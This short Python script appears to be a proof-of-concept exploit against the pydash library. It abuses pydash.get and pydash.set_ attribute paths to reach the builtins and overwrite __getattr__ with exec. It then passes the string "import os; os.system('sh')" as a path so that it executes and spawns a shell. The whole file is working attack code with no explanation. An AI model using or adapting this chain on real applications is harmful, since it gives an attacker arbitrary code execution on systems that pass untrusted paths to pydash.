#!/usr/bin/env python3
import pydash


class Dummy:
    def __init__(self) -> None:
        self.__class__.__class_getitem__ = self.__reduce_ex__
        self.newobj = self.__class__[3][0]
        self.__class__.__class_getitem__ = self.newobj.__getattribute__

def main():
    obj = Dummy()
    # print(pydash.get(obj, "__class__.__dir__")())
    # print(dir(obj.__class__))
    src = "__class__.__builtins__.exec"
    dst = "__class__.__getattr__"
    pydash.set_(obj, dst, pydash.get(obj, src))
    src = "import os; os\.system('sh')"
    dst = "foo"
    pydash.set_(obj, dst, pydash.get(obj, src))
if __name__ == "__main__":
    main()

